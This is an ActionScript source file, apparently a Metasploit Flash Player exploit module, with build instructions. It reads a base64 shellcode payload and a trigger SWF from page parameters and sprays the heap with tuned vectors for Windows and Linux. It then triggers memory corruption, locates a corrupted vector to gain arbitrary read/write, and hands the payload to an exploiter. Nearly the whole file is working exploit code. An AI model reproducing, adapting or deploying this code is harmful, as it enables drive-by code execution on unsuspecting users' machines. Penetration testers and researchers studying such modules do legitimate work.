// Build how to:
// 1. Download the AIRSDK, and use its compiler.
// 3. Download the Flex SDK (4.6)
// 4. Copy the Flex SDK libs (<FLEX_SDK>/framework/libs) to the AIRSDK folder (<AIR_SDK>/framework/libs)
//      (all of them, also, subfolders, specially mx, necessary for the Base64Decoder)
// 5. Build with: mxmlc -o msf.swf Exploit.as

// It uses some original code from @hdarwin89 for exploitation using ba's and vectors

package
{
    import flash.display.Sprite
    import flash.display.LoaderInfo
    import flash.display.Loader
    import flash.utils.ByteArray
    import flash.utils.Endian
    import flash.utils.* 
    import flash.external.ExternalInterface
    import mx.utils.Base64Decoder
    

    public class Exploit extends Sprite 
    {
        private var uv:Vector.<uint> = new Vector.<uint>
        private var exploiter:Exploiter
        
        private var spray:Vector.<Object> = new Vector.<Object>(89698)
        private var interval_id:uint
        private var trigger_swf:String 
        private var b64:Base64Decoder = new Base64Decoder()
        private var payload:ByteArray
        private var platform:String
        private var os:String
        private var original_length:uint = 0

        public function Exploit() 
        {
            var i:uint = 0
            platform = LoaderInfo(this.root.loaderInfo).parameters.pl
            os = LoaderInfo(this.root.loaderInfo).parameters.os
            trigger_swf = LoaderInfo(this.root.loaderInfo).parameters.tr
            var b64_payload:String = LoaderInfo(this.root.loaderInfo).parameters.sh
            var pattern:RegExp = / /g;
            b64_payload = b64_payload.replace(pattern, "+")
            b64.decode(b64_payload)
            payload = b64.toByteArray()
            
            if (platform == 'win') { 
                original_length = 0x1e
                for (i = 0; i < 89698; i = i + 1) {
                    spray[i] = new Vector.<uint>(1014)
                    spray[i][0] = 0xdeadbeef
                    spray[i][1] = 0xdeedbeef
                    spray[i][2] = i
                    spray[i][29] = 0x14951429
                }

                for(i = 0; i < 89698; i = i + 1) {
                    spray[i].length = 0x1e
                }
            } else if (platform == 'linux') {
                original_length = 1022 
                for (i = 0; i < 89698; i = i + 1) {
                    spray[i] = new Vector.<uint>(1022)
                    spray[i][0] = 0xdeadbeef
                    spray[i][1] = 0xdeedbeef
                    spray[i][2] = i
                    spray[i][29] = 0x956c1490   // 0x956c1490 + 0xb6c => 0x956c1ffc => controlled by position 1021
                    spray[i][39] = 1            // 0x956c1fac + 0xf8 => is_connected = 1 in order to allow corruption of offsets 0x54 and 0x58
                    spray[i][1021] = 0x956c1fac // 0x956c1fac + 0x54 => 0x956c2000 (0x54, and 0x58 offsets are corrupted)
                }
            }
    
            var trigger_byte_array:ByteArray = createByteArray(trigger_swf)
            trigger_byte_array.endian = Endian.LITTLE_ENDIAN
            trigger_byte_array.position = 0
            // Trigger corruption
            var trigger_loader:Loader = new Loader()
            trigger_loader.loadBytes(trigger_byte_array)

            interval_id = setTimeout(do_exploit, 2000)
        }


        private function createByteArray(hex_string:String) : ByteArray {
            var byte:String
            var byte_array:ByteArray = new ByteArray()
            var hex_string_length:uint = hex_string.length
            var i:uint = 0
            while(i < hex_string_length)
            {
                byte = hex_string.charAt(i) + hex_string.charAt(i + 1)
                byte_array.writeByte(parseInt(byte,16))
                i = i + 2
            }
            return byte_array
        }

        private function do_exploit():void {
            clearTimeout(interval_id)

            for(var i:uint = 0; i < spray.length; i = i + 1) {
                if (spray[i].length != 1022 && spray[i].length != 0x1e) {
                    Logger.log('[*] Exploit - Found corrupted vector at ' + i + ' with length 0x' + spray[i].length.toString(16))
                    spray[i][1022] = 0xffffffff                    
                    spray[i + 1][0x3ffffbff] = spray[i][1023]
                    spray[i + 1][0x3ffffbfe] = original_length
                    uv = spray[i + 1]
                    break
                }
            }

            for(i = 0; i < spray.length; i = i + 1) {
                if (spray[i].length == 1022 || spray[i].length == 0x1e) {
                    spray[i] = null
                }
            }

            if (uv == null || uv.length != 0xffffffff) {
                return
            }

            exploiter = new Exploiter(this, platform, os, payload, uv)
        }

    }
}